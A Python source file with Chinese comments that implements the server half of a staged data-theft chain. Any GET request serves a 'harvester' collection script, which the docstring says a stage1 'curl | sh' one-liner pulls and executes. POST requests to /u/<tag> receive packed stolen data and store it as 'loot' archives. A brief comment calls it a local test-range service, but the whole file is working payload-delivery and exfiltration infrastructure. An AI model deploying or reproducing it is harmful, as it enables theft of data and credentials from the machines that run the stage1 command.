#!/usr/bin/env python3
"""
serve.py —— 接收端 + stage2 分发

两个职责：
  1. 任何 GET / 都返回采集脚本  →  stage1 里的 `curl -s HOST:PORT | sh` 拉到的就是它
  2. POST /u/<tag> 接收打包数据  →  存成 loot/<tag>-<时间>.tar.gz

用法：
  python3 serve.py --port 8080
  python3 serve.py --port 8080 --bind 0.0.0.0

注意：这是本地测试用的靶场服务，不要挂公网。
"""
import argparse
import datetime
import http.server
import io
import os
import socketserver
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
HARVESTER = os.path.join(HERE, "harvester.sh")
LOOT = os.path.join(HERE, "loot")


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        # 安静一点，只打关键行
        sys.stderr.write("[%s] %s\n" % (
            datetime.datetime.now().strftime("%H:%M:%S"),
            fmt % args))

    # ---------------- GET：下发 stage2 ----------------
    def do_GET(self):
        try:
            with io.open(HARVESTER, "rb") as f:
                body = f.read()
        except Exception as e:
            self.send_error(500, "harvester missing: %s" % e)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    # ---------------- POST：接收打包数据 ----------------
    def do_POST(self):
        tag = "unknown"
        if self.path.startswith("/u/"):
            tag = self.path[3:].strip("/") or "unknown"
        tag = "".join(c for c in tag if c.isalnum() or c in "._-")[:64] or "unknown"

        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length <= 0:
            self.send_error(400, "empty body")
            return

        os.makedirs(LOOT, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        path = os.path.join(LOOT, "%s-%s.tar.gz" % (tag, ts))

        try:
            with io.open(path, "wb") as f:
                remaining = length
                while remaining > 0:
                    chunk = self.rfile.read(min(65536, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    remaining -= len(chunk)
        except Exception as e:
            self.send_error(500, "write failed: %s" % e)
            return

        size = os.path.getsize(path)
        caller = self.headers.get("X-Tag", "-")
        sys.stderr.write(
            "\n  ★ LOOT  %s  (%s bytes)  header-tag=%s\n"
            % (path, "{:,}".format(size), caller))

        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--bind", default="127.0.0.1")
    args = ap.parse_args()

    os.makedirs(LOOT, exist_ok=True)
    if not os.path.exists(HARVESTER):
        sys.stderr.write("警告: 找不到 %s，GET 会 500\n" % HARVESTER)

    srv = Server((args.bind, args.port), Handler)
    sys.stderr.write("=" * 70 + "\n")
    sys.stderr.write("  stage2 分发:  http://%s:%d/  (任何路径都返回 harvester.sh)\n"
                     % (args.bind, args.port))
    sys.stderr.write("  数据接收:     POST http://%s:%d/u/<tag>\n"
                     % (args.bind, args.port))
    sys.stderr.write("  落地目录:     %s\n" % LOOT)
    sys.stderr.write("=" * 70 + "\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        sys.stderr.write("\n退出\n")


if __name__ == "__main__":
    main()
